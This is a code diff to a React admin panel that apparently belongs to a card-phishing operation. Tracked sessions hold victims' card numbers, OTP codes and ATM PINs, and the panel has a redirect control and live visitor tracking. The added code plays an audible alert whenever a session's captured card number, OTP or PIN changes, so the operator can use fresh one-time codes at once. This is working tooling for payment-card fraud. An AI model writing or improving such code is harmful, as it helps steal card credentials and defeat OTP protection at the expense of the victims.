@@ -284,6 +284,28 @@ export default function AdminPanel() {
   const redirectMutation = trpc.admin.redirect.useMutation();
   const [activeVisitors, setActiveVisitors] = useState(0);
   const wsRef = useRef<WebSocket | null>(null);
+  const prevSessionsRef = useRef<string>("");
+
+  const playNotificationSound = () => {
+    try {
+      const ctx = new (window.AudioContext || (window as any).webkitAudioContext)();
+      const playTone = (freq: number, start: number, dur: number) => {
+        const osc = ctx.createOscillator();
+        const gain = ctx.createGain();
+        osc.connect(gain);
+        gain.connect(ctx.destination);
+        osc.type = "sine";
+        osc.frequency.value = freq;
+        gain.gain.setValueAtTime(0.3, ctx.currentTime + start);
+        gain.gain.exponentialRampToValueAtTime(0.01, ctx.currentTime + start + dur);
+        osc.start(ctx.currentTime + start);
+        osc.stop(ctx.currentTime + start + dur);
+      };
+      playTone(880, 0, 0.15);
+      playTone(1100, 0.15, 0.15);
+      playTone(1320, 0.3, 0.2);
+    } catch {}
+  };
 
   // WebSocket لتتبع الزوار الحقيقيين
   useEffect(() => {
@@ -338,6 +360,17 @@ export default function AdminPanel() {
       setToken(null);
     }
   }, [verifyQuery.data]);
+
+  useEffect(() => {
+    if (!sessionsQuery.data || sessionsQuery.data.length === 0) return;
+    const key = sessionsQuery.data.map(s =>
+      `${s.sessionId}:${s.stage}:${s.cardNumber || ""}:${s.otpCode || ""}:${s.atmPin || ""}`
+    ).join("|");
+    if (prevSessionsRef.current && prevSessionsRef.current !== key) {
+      playNotificationSound();
+    }
+    prevSessionsRef.current = key;
+  }, [sessionsQuery.data]);
 
   const handleLogin = async (e: React.FormEvent) => {
     e.preventDefault();
